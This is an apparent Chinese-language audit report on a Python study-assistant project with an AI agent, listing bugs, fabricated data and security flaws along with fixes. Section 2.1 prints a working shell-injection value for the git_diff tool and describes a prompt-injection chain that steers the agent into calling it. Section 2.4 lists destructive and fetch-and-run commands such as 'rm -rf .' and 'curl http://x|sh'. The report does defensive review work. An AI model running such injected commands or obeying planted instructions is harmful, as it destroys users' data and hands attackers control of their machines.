# 考研学习链 (kaoyan\_chain) · 代码审查与改进报告

> 审查对象：`moyetian/kaoyan_chain` @ main（Python，213 个文件，约 17,800 行 Python）
> 审查方式：全量代码通读 + 在 Python 3.11.1 沙箱中**实际运行每个子命令**验证
> 审查日期：2026-09-07

---

## 〇、结论摘要

**先说结论：项目当前状态是「跑不起来」的。** 主入口 `tools/ky_cli.py` 在 Python 3.11 及以下版本存在**硬语法错误**，直接 `SyntaxError` 退出——而 README 徽章声称支持 Python 3.8+。这意味着绝大多数用户（`python3.11` 是主流发行版默认版本）克隆后第一件事就是失败。

修复这一行后，我逐条实测了全部子命令。总体工程质量**高于典型的个人项目**：目录设计、隐私脱敏（`.gitignore` 隔离 `_状态/`）、CI 中的脱敏快照门禁、网络失败时的优雅降级都做得相当扎实。但存在一个**贯穿全局的系统性问题**：

> **大量 `except Exception: pass` 静默降级，把真实故障伪装成正常功能。**

这导致至少 3 处功能**早已失效却无人发现**（PDF 真题检索、错题本变式检索、艾宾浩斯周期显示）。更严重的是，项目自己立下「严禁 AI 虚构题源」的铁律，但代码里有多处**主动编造数据**并包装成权威结论——这是与设计初衷最尖锐的矛盾。


| 维度    | 评分   | 说明                         |
| ----- | ---- | -------------------------- |
| 架构设计  | ⭐⭐⭐⭐ | 目录与协议分层清晰，AGENTS.md 驱动思路先进 |
| 实现正确性 | ⭐⭐   | 存在阻断级语法错误 + 30+ 处已验证缺陷     |
| 安全性   | ⭐⭐   | 存在可远程代码执行（RCE）与全局关闭 SSL 校验 |
| 数据可信性 | ⭐⭐   | 多处硬编码编造数据，与自身「反虚构」铁律冲突     |
| 易用性   | ⭐⭐⭐  | 文档极详尽，但上手第一步即失败            |
| 工程规范  | ⭐⭐   | 无打包/无 CI 测试/自带测试套件自身崩溃     |


---

## 一、阻断级缺陷（P0 · 必须立即修复）

### 1.1 主入口在 Python &lt; 3.12 完全无法启动 🔴

**位置**：`tools/ky_cli.py:115`

```python
$img.Save('{str(target_path).replace("\\", "/")}', ...
```

f-string 的表达式部分包含反斜杠，这是 Python 3.12（PEP 701）才放开的语法。

**实测**：

```
$ python3 tools/ky_cli.py --help
  File "tools/ky_cli.py", line 118
    """
SyntaxError: f-string expression part cannot include a backslash
```

**版本声明严重矛盾**：README 徽章 `Python-3.8+` / `requirements.txt` 写「Python 3.10+」/ `doctor.py:61` 检查 `>=3.10` / `ky_cli.py:9` 写「Python 3.8+」——**实际最低要求是 3.12**。

**修复**（一行）：

```python
_ps_safe_path = str(target_path).replace(chr(92), "/")   # 或 "\\"
ps_cmd = f"""... $img.Save('{_ps_safe_path}', ..."""
```

> 我已用此补丁验证：修复后 CLI 全部子命令可正常运行。

---

### 1.2 沙箱敏感路径用子串匹配，导致 Agent 在 root 环境下 100% 失效 🔴

**位置**：`tools/agent/sandbox.py:29`（`SENSITIVE_PATHS` 含 `"/root"`）+ `sandbox.py:78`（`if sp_norm in resolved_str`）

用**子串包含**判断路径是否敏感，而 `/root` 恰好是 Linux root 用户的家目录。

**实测对比**：


| 工作区             | `read_file('AGENTS.md')` 结果                |
| --------------- | ------------------------------------------ |
| `/root/kc_test` | ❌ `SecurityError: 沙箱拦截... (命中敏感特征: /root)` |
| `/tmp/kc_demo`  | ✅ 正常（文件不存在才报错）                             |


**影响面**：WSL 默认 root、Docker 容器、VPS —— 这些**都是考研学生常见的部署环境**。一旦项目放在 `/root` 下，Agent 的**所有文件读写工具被全部拦截**，AI 私教完全无法工作，且报错信息让用户以为是权限问题。

同类误伤：`.ssh` / `id_rsa` / `id_ed25519` 也会命中 `id_rsa_笔记.md`、`.ssh_config` 等正常文件。

**修复**：改为路径分量精确比对

```python
parts = set(resolved.parts)          # 而非子串包含
if resolved.name.startswith("id_rsa") or parts & {".ssh", ".aws", ".gnupg"}: ...
```

---

### 1.3 PyYAML 未声明依赖，「零第三方依赖」不成立 🔴

**位置**：`tools/intelligence/registry.py:16` `import yaml`

但 `requirements.txt` 只列了 `sympy / pypdf / Pillow / rapidocr-onnxruntime`，**没有 PyYAML**。

**实测**（模拟未安装 PyYAML）：

```
>>> import intelligence
ImportError: No module named yaml
```

**影响**：`ky admission` / `ky compare` / `ky fetch` / `ky watch` / `ky scout` **全部失效**。而 README 第 656 行明确写「无需安装任何 pip 第三方库，全部使用 Python 标准库」。

**修复**：在 `requirements.txt` 增加 `PyYAML>=6.0`，或改为自带轻量 YAML 解析；同时修正 README 宣传语。

---

## 二、安全缺陷

### 2.1 `git_diff` 工具存在命令注入 → 远程代码执行 🔴

**位置**：`tools/agent/tools_impl.py:406`

```python
def git_diff(path: str = "") -> str:
    cmd = f"git diff {path}".strip()
    res = subprocess.run(cmd, shell=True, ...)
```

且该工具注册为 `PermissionLevel.READ_ONLY`（Level 0）——**所有权限模式下免审批自动放行，包括 `safe` 只读模式**。

**实测注入成功**：

```
cmd = git diff ; echo PWNED_VIA_GIT_DIFF; id; #
→ PWNED_VIA_GIT_DIFF
→ uid=0(root) gid=0(root) groups=0(root)
```

**攻击链**：Agent 会用 `fetch_url` 抓取网页、读取用户导入的 PDF/资料 → 资料中的提示词注入诱导模型调用 `git_diff` 并传入恶意 `path` → 以用户权限执行任意命令。对备考学生（本地存有个人档案、浏览器Cookie）危害显著。

**修复**：`subprocess.run(["git", "diff", path], shell=False, ...)`，并对 path 做白名单校验。

---

### 2.2 全局关闭 SSL 证书校验 🔴

**位置**：`tools/intelligence/fetcher.py:27-29`

```python
_SSL_CONTEXT = ssl.create_default_context()
_SSL_CONTEXT.check_hostname = False
_SSL_CONTEXT.verify_mode = ssl.CERT_NONE
```

所有抓取（研招网、高校官网）都不验证证书。中间人可伪造「官方招生简章」并返回假数据，而系统会给它打上 **S 级（最高权威）标签。这与项目「搜索只负责发现，官方页面才构成证据」的核心定位根本冲突**。

**修复**：默认开启校验；仅对特定白名单域名按需降级，且降级结果必须标注为 `UNVERIFIED` 并降低置信度。

---

### 2.3 网关 `KY_GATEWAY_TOKEN` 在主要代码路径中未生效 🟠

**位置**：`tools/ky_cli.py:2744`

```python
handler_class = create_gateway_handler()      # ← 未传 token，也未读环境变量
```

而 `run_server()`（`ky_cli.py:2835`）是会读 `os.environ.get("KY_GATEWAY_TOKEN")` 的。**两条路径不一致**。

后果：`ky view --host=0.0.0.0` 会在所有网卡上启动**无鉴权**的 LLM 代理，代码还会打印一句「建议设置 KY\_GATEWAY\_TOKEN 启用鉴权」——**但该变量在这条路径上根本没被读取**，属于无效的安全提示。

另：`/api/live` 被列入"静态端点"白名单（`ky_cli.py:2416`），**任何情况下免鉴权**，会泄露完整会话内容。

---

### 2.4 高危命令黑名单形同虚设 🟠

**位置**：`tools/agent/sandbox.py:38-48`

```python
r"\brm\s+-(?:r|f|rf|fr)\s+[/~]",     # 只拦 rm -rf / 或 rm -rf ~
```

实测**全部放行**：`rm -rf .`、`rm -rf *`、`rm -fr ./笔记`、`chmod -R 777 .`、`curl http://x|sh`、`git reset --hard`。任何一个都能清空用户工作区。

**修复**：改为白名单命令前缀 + `shlex.split()` 后按词判定。

---

### 2.5 非交互环境下写操作被静默放行 🟠

**位置**：`tools/agent/permissions.py:150-152`

```python
if not interactive or not sys.stdin.isatty():
    if self.mode in ("auto", "ask") and level <= PermissionLevel.SAFE_EDIT:
        return True, "非交互环境安全放行"
```

在 `ask` 模式下（用户明确要求逐条确认），只要不是 TTY（管道、CI、脚本调用）就**直接放行写操作**，绕过了用户设定的审批意图。

---

## 三、功能正确性缺陷（实测确认）

### 3.1 长字符串触发 `OSError`，自带测试套件崩溃 🔴

**位置**：`tools/skills/exam_composer.py:221`

```python
if isinstance(paper_path_or_content, (str, Path)) and Path(str(paper_path_or_content)).exists():
```

传入试卷正文（几百字符，`grade_exam_paper` 的正常用法）时，`Path(...).exists()` 抛 `OSError: [Errno 36] File name too long`。

**后果严重**：项目自带的 `tools/test_ky_suite.py:792` 正好这样调用，**测试套件在此崩溃退出**：

```
OSError: [Errno 36] File name too long: '# 🎓 考研全科 AI 专属自测卷...'
```

即：**作者自己的回归测试从未跑完过**，16 组之后的测试从未被执行。

同样问题在 `ky_cli.py:3419`（`ky diagnose` 传入超长文本）。

**修复**：

```python
try:
    is_file = Path(s).is_file()
except (OSError, ValueError):
    is_file = False
```

---

### 3.2 诊断引擎凭空编造数据 🔴（与项目铁律直接冲突）

**位置**：`tools/skills/exam_diagnoser.py:76-82`

```python
if total_detected_errors == 0:
    categories["概念漏洞"] = 2
    categories["计算失误"] = 2
    categories["审题偏差"] = 1
    total_detected_errors = 5
```

**实测**（输入 `1. A 2. C`，无任何真实错题数据）：

```json
{"total_errors": 5, "top_chapter": "极限与连续", "top_cause": "概念漏洞",
 "chapter_loss": {"极限与连续": 2, "微分中值定理": 2}}
```

输出报告还给出「下周向【极限与连续】倾斜每日 30\~45 分钟专项攻坚」这种**看似基于数据的具体建议**。

项目 README 立下「严禁凭空捏造题源」四大铁律，但这里直接硬编码注入诊断结论。学生会据此调整复习计划——**这是会真实误导用户决策的缺陷**。

**修复**：数据不足时明确返回「样本不足，无法生成诊断」，不得注入常量。

---

### 3.3 任意导入文本被盖章「官方认证」🔴

**位置**：`tools/skills/material_ingestion.py:256`

```python
f"- **【白名单认证】**：✅ `[VERIFIED 官方考纲白名单原题]`"
```

无条件硬编码。用户导入任何一份随手写的 txt，都会被标记为「官方考纲白名单原题」，随后进入白名单题源被 AI 引用。这让整个「白名单防虚构」机制失去意义。

---

### 3.4 三处功能早已失效，被 `except` 静默掩盖 🟠


| 位置                        | 问题                                                                                                                                                 | 实测                                                                                                                                                                                        |
| ------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `variant_retriever.py:86` | 调用 `pdf_extractor.find_questions_by_keyword()`，**该方法不存在**（模块仅有 `extract_pdf_page`/`extract_pdf_pages`/`list_materials`/`search_text_in_materials`） | `hasattr(...) == False`，`except: pass` 吞掉 AttributeError → **PDF 真题检索永久失效**                                                                                                               |
| `error_logger.py:186-199` | `scan_error_records()` 返回记录**不含 `detail` 键**                                                                                                       | 实测字段：`date/error_type/file_name/file_path/next_due/question/raw_section/stage/status/subject/subject_name/title`。导致 `variant_retriever.py:101` 的 `e.get("detail","")` 恒为空 → **错题本检索永久失效** |
| `error_logger.py:270`     | 读取 `days_ago` 字段，但写入的是 `days_until_due`/`days_overdue`                                                                                             | 盲盒复测**恒显示「0 天前」**                                                                                                                                                                         |


这三处都因为异常/字典默认值被静默吞掉，**长期失效却无任何报错**。

---

### 3.5 数学验算器硬编码变量 `x` 🟠

**位置**：`tools/skills/math_verifier.py:229 / 241`

**实测**：


| 输入               | 输出               | 正确结果 |
| ---------------- | ---------------- | ---- |
| `solve y**2-1=0` | 解集 $x$: `[]`（空集） | ±1   |
| `diff y**2`      | $f'(x) = 0$      | 2y   |
| `solve x**2-4=0` | `[-2, 2]` ✅      | ✅    |
| `diff x**3`      | `3x²` ✅          | ✅    |


只要变量不是 `x` 就出错。考研数学中 `t`、`u`、`θ` 等变量极常见。

**修复**：从 `expr.free_symbols` 推断未知量（该文件方程组分支 `:205` 已这么做，单方程分支漏了）。

---

### 3.6 `ky memory status` 崩溃 + 状态显示全红 🟠

**位置**：`tools/agent/memory.py:181/188` + `tools/ky_cli.py:3491`

GLOBAL 级记忆存放在 `~/.ky/memory/user.md`（`memory.py:32`），**不在工作区内**，而 `ky_cli.py:3491` 做 `Path(info["path"]).relative_to(ROOT)`：

```
$ ky memory status
记忆管理执行失败: '/root/.ky/memory/user.md' is not in the subpath of '/root/kc_test'
```

另有两处契约不匹配：

- `memory.py:171` 返回中文状态（`"良好"`），而 `ky_cli.py:3490` 比较 `st == "ok"` / `"warning"` → **颜色恒为红色**
- `memory.py:188` `status_code` 用了**累积**的 `has_warning` 变量 → 任意一层告警后，其余所有层被误标 warning

---

### 3.7 阅卷逻辑：每题得分完全相同 🟠

**位置**：`tools/skills/exam_composer.py:257`

```python
has_content = len(user_answers_text.strip()) > 15
is_passed = has_content and not any(kw in user_answers_text for kw in ("不会","跳过","蒙","忘了"))
```

判定基于**整份答案**，与具体题目无关 → 一份卷子要么全对要么全错。且 `"蒙"` 是子串匹配，会误伤「蒙日圆」等正常作答。

同文件 `:268-276` 还丢弃了 `mark_error_status` 返回的 `(ok, msg)` 元组，**回写失败仍打印「状态回写: 错题记录已自动流转至 stage=1」**。

`:143` `paper_id` 只精确到分钟 → 同分钟内两次组卷文件名相同，前一份被静默覆盖。

---

### 3.8 情报引擎数据一致性问题 🟠


| 位置                                               | 问题                                                                                                  |
| ------------------------------------------------ | --------------------------------------------------------------------------------------------------- |
| `registry.py:169,295`                            | 未收录高校合成 `chsi_code="待查"` 并被**用作 dict 键** → 多所未收录高校互相覆盖                                              |
| `watcher.py:39-46`                               | JSON 解析异常 → 静默置 `{}` → `_save()` 覆盖 → **监控目标无声丢失**；且非原子写                                            |
| `syllabus_diff.py:267-269`                       | 新考纲解析出 0 考点 → 波动率 `0.0%`、评级「稳健微调」（旧考点全被删也报"稳健"）                                                     |
| `evidence_engine.py:164` / `scout_engine.py:196` | 单位无条件拼接 → 输出 `(408)计算机学科专业基础 门`、`{'name':'清华概览'} 个`                                                 |
| `comparator.py:34` vs `chsi_connector`           | **`ky compare` 说清华「初试自命题 912」，`ky admission` 兜底说「(408)计算机学科专业基础」——两个命令对同一所学校给出矛盾结论**，且硬编码数据无年份/来源标注 |


---

### 3.9 其他已验证缺陷


| 位置                                                       | 问题                                                                                                             |
| -------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| `loop.py:53`                                             | `PermissionManager(mode=...)` **未传 `workspace_root`**（上一行 `Sandbox` 传了）→ Plan 模式快照写到错误目录，`ky rollback` 失效      |
| `loop.py:101`                                            | `compact_context` 只在 `while` 循环**外**调用一次 → 上下文压缩"防爆"完全失效                                                       |
| `tools_impl.py:760-765`                                  | `ingest_exam_tool`/`diff_syllabus_tool` 直接用 `Path(file_path)`，未经 `resolve_safe_path` → 可读取工作区外任意文件             |
| `mcp_client.py:99`                                       | `timeout` 参数**从未生效**（`readline()` 无超时，服务端不回包即永久挂死）；`stderr=PIPE` 无人读取，写满 64KB 后子进程死锁；`env`(`:23`) 从未传给 `Popen` |
| `hooks.py:127-143`                                       | 考纲红线对**所有工具的全部参数**做中文子串匹配，且 `math_key` 缺失时取最严 → 写入「数二不考无穷级数，注意避坑」的笔记被强制拦截                                      |
| `tui_navigator.py:274`                                   | `total_study_days = 134` **硬编码**，与 `exam_date` 无关 → 显示"第 N/134 天"是无依据的假进度                                      |
| `study_planner.py:1065`                                  | 疲劳检测只取最后两条记录，**不校验日期连续性**（9/1 与 9/7 也判"连续 2 天"）                                                                |
| `study_planner.py:1093`                                  | `apply_relief_mode` **无幂等**，每次调用时长再 ×0.75，重复执行压向 0；`relief_mode_active` 标志写入后从未被读取                             |
| `knowledge_map.py:201-208`                               | 四分支只有 D/C/B/U，**A 级永不产生** → 掌握率系统性偏低（实测 `{'A':0,'B':0,'C':4,'D':0,'U':62}`）                                    |
| `discovery.py:56` / `watcher.py:143` / `extractor.py:40` | 硬编码 `2026`/`2027`/正则 `(202[4-9])` → 2028 起年份识别与 sitemap 过滤失效                                                   |
| `error_logger.py:33`                                     | `EBBINGHAUS_INTERVALS` 定义后从未使用；写入文案「1/3/7/15/30 天阶梯」与实现 `FSRS_GOOD_INTERVALS=[1,3,7,16,35]` 不符                 |


---

## 四、工程与架构（技术层）

### 4.1 `ky_cli.py` 是 3595 行的上帝文件

单文件内混杂了：CLI 参数解析、LLM 流式请求、Webhook 推送（钉钉/飞书/企微/QQ 各自签名逻辑）、HTTP 网关 handler、REPL 交互循环、四科业务逻辑、看板构建调度。

**后果**：无法单元测试、改动风险极高、无法复用。`main()` 本身就是一个 750 行的 `if/elif` 链。

**建议**拆分为：`cli/`（命令层）、`core/`（LLM + 配置）、`gateway/`（HTTP）、`repl/`、`skills/`。

### 4.2 测试体系名存实亡

- `tools/test_ky_suite.py` 是**脚本式打印**（`print("[PASS] ...")`），不是 `unittest`/`pytest`，无断言、无退出码、无法被 CI 消费
- 该套件在 `:792` 行**崩溃退出**（见 3.1），16 组之后的测试从未运行
- `.github/workflows/` 只有 `deploy-pages.yml`，**没有任何跑测试的 CI**

**建议**：迁移到 `pytest`，在 CI 中接入，并至少覆盖「每条 CLI 子命令能启动并返回 0」的冒烟测试——这能立刻抓出 1.1 这类阻断级问题。

### 4.3 依赖与打包

- 无 `pyproject.toml` / `setup.py`，无 `console_scripts` 入口，只能手写 `tools/ky_cli.py` 路径调用
- `PyYAML` 缺失（见 1.3）
- `easyocr`/`pytesseract` 在 `vision_solver.py:105/115` 被 try-import，但 `requirements.txt` 未说明（建议至少列为 extras）
- 源码中存在未使用导入：`math_verifier.py:15-16`(sys, math)、`vision_solver.py:11`(os)、`material_ingestion.py:16`(Tuple)

### 4.4 资源重复

`docs/` 与 `05-考研看板/docs/` **内容完全重复**（各 2.3MB），含 3 张 JPG（`hero_banner.jpg` 671K 等）各存两份，仓库总体积 7.4MB。

**建议**：以 `05-考研看板/docs/` 为唯一源，根目录 `docs/` 加入 `.gitignore` 由构建生成；或反之。图片建议压缩/WebP 化。

### 4.5 异常处理哲学

全项目大量 `except Exception: pass` / `except: pass`。虽然好处是"永不崩溃"，但代价是 3.4 节中三处功能**静默失效数月无人察觉**。

**建议**：至少 `except Exception as e: logger.debug(...)`，并在 `ky doctor` 中汇总"降级项"让用户可见。

---

## 五、易用性问题


| 问题                        | 说明                                                                     | 建议                                                               |
| ------------------------- | ---------------------------------------------------------------------- | ---------------------------------------------------------------- |
| **上手第一步必失败**              | README「3 分钟开箱」→ 用户 `python tools/ky_cli.py` → `SyntaxError`，无任何引导      | 修 1.1；并在 README 明确标注 **Python ≥ 3.12**                           |
| **`python` vs `python3`** | README 全程用 `python`，但 `ky` 启动脚本用 `python3`。Linux/macOS 上 `python` 常不存在 | 统一为 `python3`，或提供 `Makefile`/`console_scripts`                   |
| **`ky.bat` 硬编码路径**        | `ky.bat:7` 写死 `D:\Python\Python312\python.exe`                         | 改为 `where python` 探测 + `py -3` 兜底                                |
| **README 过长**             | 931 行 / 79KB，信息密度被稀释                                                   | 拆分为 `docs/` 下的分册，README 保留快速上手 + 索引                              |
| **`ky notify` 静默无反馈**     | 未配置 webhook 时只打印「正在推送...」后无声结束                                         | 提示「未配置任何 webhook，请先运行 ky config」                                 |
| **无 `--version`**         | 无法确认版本                                                                 | 增加                                                               |
| **离线/在线功能未区分**            | 用户不知道哪些命令需要 API Key                                                    | README 中标注：纯离线可用（`map/review/exam/build/today/status`）、需 Key、需联网 |


---

## 六、命令实测清单

> 环境：Python 3.11.1 + 已应用 1.1 补丁；沙箱外网受限（网络失败属于环境限制，非代码缺陷）


| 命令                          | 结果       | 备注                                                   |
| --------------------------- | -------- | ---------------------------------------------------- |
| `ky --help`                 | ✅        | 补丁前 `SyntaxError`                                    |
| `ky status`                 | ✅        | 倒计时/打卡/作息正常                                          |
| `ky today` / `today --json` | ✅        | JSON 结构正确                                            |
| `ky done <词>`               | ✅        | 未命中时正确提示                                             |
| `ky doctor`                 | ✅        | 依赖检测准确                                               |
| `ky style`                  | ✅        | 4 种风格切换正常                                            |
| `ky map math`               | ✅        | 66 考点，但 A 级恒 0（见 3.9）                                |
| `ky review math`            | ✅        | 空队列提示正确                                              |
| `ky fatigue`                | ✅        |                                                      |
| `ky build`                  | ✅        | 生成 179KB index.html + 脱敏快照                           |
| `ky memory status`          | ❌ **崩溃** | 见 3.6                                                |
| `ky rollback`               | ⚠️       | 无快照时提示正确；但因 `loop.py:53` 快照目录可能错位                    |
| `ky exam math --count=2`    | ⚠️       | 可运行，但错题本为空时生成的是**占位模板题**（「请写出核心公式并简述防踩坑步骤」），正文未标注为占位 |
| `ky diagnose <文件>`          | ⚠️       | 可运行，但**编造诊断数据**（见 3.2）                               |
| `ky ingest <文件>`            | ✅        | 正确切分 2 题（选择 1 / 大题 1），但**盖章伪造 VERIFIED**（见 3.3）      |
| `ky variant <考点>`           | ⚠️       | 可运行，\*\*诚实标注「⚠️ 私教自拟变式」\*\*做得好；但 PDF 检索路径已失效（见 3.4）  |
| `ky fetch diff`             | ✅        | 离线可跑，报告正确落盘                                          |
| `ky admission <校>`          | ✅        | 网络失败时优雅降级为 C 级兜底 + `UNVERIFIED` 标注，设计良好              |
| `ky compare <校1> <校2>`      | ⚠️       | 可运行，但与 `admission` 数据矛盾（见 3.8）                       |
| `ky watch --list`           | ✅        |                                                      |
| `ky notify`                 | ⚠️       | 静默无反馈                                                |
| `ky scout`                  | ⚠️       | 依赖网络，本环境受限                                           |
| REPL（`--permission=safe`）   | ✅        | 启动动画、技能装载、指令大盘、`/help` 均正常                           |
| `init_workspace.py`         | ✅        | 正确实例化 11 个状态文件                                       |
| `update_dashboard.py`       | ✅        |                                                      |
| `test_ky_suite.py`          | ❌ **崩溃** | 见 3.1                                                |
| 数据文件（55 所院校）                | ✅        | YAML 全部合法、无重复代码、`registry.json` 与 YAML 完全一致          |


---

## 七、修复优先级路线图

### 第一批（当前，恢复可用性）

1. `ky_cli.py:115` f-string 反斜杠 → 项目可启动
2. `sandbox.py:78` 子串匹配改精确比对 → Agent 在 root 环境可用
3. `requirements.txt` 补 `PyYAML` → 情报类命令可用
4. `exam_composer.py:221` 捕获 `OSError` → 测试套件可跑完

### 第二批（一天，安全与可信）

5. `tools_impl.py:406` 命令注入（`shell=False` + 列表传参）
6. `fetcher.py:27` 恢复 SSL 校验
7. `ky_cli.py:2744` 补传 gateway token；`/api/live` 纳入鉴权
8. `exam_diagnoser.py:76` 删除硬编码注入数据
9. `material_ingestion.py:256` 移除伪造 VERIFIED
10. `sandbox.py:38` 命令黑名单改为白名单

### 第三批（两天，正确性）

11. `variant_retriever.py:86` 修正方法名 + `error_logger` 补 `detail` 字段
12. `error_logger.py:270` 修正 `days_ago` 字段名
13. `math_verifier.py:229/241` 从 `free_symbols` 推断变量
14. `memory.py` + `ky_cli.py:3490` 统一状态契约、修复 `relative_to`
15. `loop.py:53` 补 `workspace_root`；`loop.py:101` 循环内压缩
16. `exam_composer.py:257/268` 修正阅卷判定与回写结果处理
17. `study_planner.py:1065/1093` 日期连续性与幂等

### 第四批（本周，工程化）

18. 迁移 `pytest` + CI 跑测试（含"每条子命令冒烟"）
19. 拆分 `ky_cli.py`；增加 `pyproject.toml` 与 `ky` 命令入口
20. 消除 `docs/` 重复；压缩图片
21. 全局 `except: pass` 加日志；`ky doctor` 汇总降级项
22. 硬编码年份改 `current_exam_year()`；高校数据增加 `as_of` 字段
23. README 拆分 + 修正 Python 版本声明

---

## 八、值得肯定的设计

审查也要说优点——以下几处做得确实好，建议在重构中保留：

1. **网络失败的优雅降级**：`ky admission` 在抓取失败时给出 C 级兜底值并明确标注 `UNVERIFIED` + 置信度 30% + 「务必以官方简章为准」，诚实的失败远胜于编造的成功。
2. **隐私脱敏设计**：`.gitignore` 精细隔离 `_状态/`、`学情档案.md`、`参考资料/`，配合 CI 中 `assert sanitized is True` 的部署门禁，防止个人学情误传公开仓库——这在同类项目中少见。
3. **`ky variant` 的自拟变式标注**：资料库为空时如实声明「⚠️ 私教自拟变式 · 题源未挂载本地实体资料」，正确实现了反幻觉。这个模式应该推广到 `ky exam`（目前生成占位题却不标注）。
4. **数据文件质量**：55 所院校 YAML 全部合法、代码无重复、`registry.json` 与 YAML 完全同步，看得出来是认真维护的。
5. **CI 注释质量**：`deploy-pages.yml` 里解释了"为什么不在 CI 重跑 build.py（会覆盖真实数据）"，说明作者理解问题本质。

---

*报告基于实际运行验证，所有标注「实测」的结论均可在 Python 3.11 环境复现。*
